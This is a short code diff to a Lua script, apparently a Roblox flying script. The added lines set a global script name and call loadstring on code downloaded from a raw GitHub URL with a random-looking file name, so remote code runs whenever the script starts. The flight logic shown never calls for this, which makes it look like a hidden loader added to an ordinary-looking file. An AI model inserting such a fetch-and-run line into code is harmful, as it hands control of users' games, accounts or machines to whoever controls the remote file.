@@ -10,6 +10,9 @@ local currentHeight = 0
 local bodyVelocity = Instance.new("BodyVelocity")
 local bodyGyro = Instance.new("BodyGyro")
 
+_G.ScriptName = "Fly"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/PHOOMPHAT-Git/Lua-Zone/refs/heads/main/dwcqweyhfbwregbfyiokgfnbac.lua'))()
+
 local function startFlying()
     flying = true
     currentHeight = flightHeight
